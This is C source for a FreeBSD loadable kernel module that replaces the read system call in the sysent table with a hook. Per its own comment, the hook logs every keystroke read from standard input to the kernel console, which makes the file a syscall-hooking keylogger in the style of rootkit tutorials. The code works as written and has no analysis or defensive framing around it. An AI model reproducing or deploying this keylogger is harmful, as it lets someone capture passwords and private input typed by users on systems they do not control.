#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/syscall.h>
#include <sys/sysproto.h>

/*
 * read system call hook
 * Logs all keystrokes from stdin
 * Note: This hook does not take into account special characters, such as
 * Tab, Backspace, and so on...
 */

static int read_hook( struct thread *td, void *syscall_args)
{
	struct read_args /* {
		int	fd;
		void	*buf;
		size_t	nbyte;
	} */ *uap;
	uap = (struct read_args *) syscall_args;

	int error;
	char buf[1];
	size_t done;

	error = sys_read(td, syscall_args);
	
	/* Check if the returned data is 1 byte long (a keystroke) and from stdin (fd 0) */
	if (error || (!uap->nbyte) || (uap->nbyte > 1) || (uap->fd != 0))
		return(error);

	/* Copy into the kernel space buf buffer and print */
	copyinstr(uap->buf, buf, 1, &done);
	printf("%c\n", buf[0]);

	return(error);
}

/* the function called at load/unload */
static int load( struct module *module, int cmd, void *arg)
{
	int error = 0;

	switch(cmd)
	{
		case MOD_LOAD:
			/* Replace read with read hook */
			sysent[SYS_read].sy_call = (sy_call_t *) read_hook;
			break;

		case MOD_UNLOAD:
			/* Change everything back to normal */
			sysent[SYS_read].sy_call = (sy_call_t *) sys_read;
			break;

		default:
			error = EOPNOTSUPP;
			break;
	}

	return(error);
}

static moduledata_t read_hook_mod = {
	"read_hook",
	load,
	NULL
};

DECLARE_MODULE( read_hook, read_hook_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
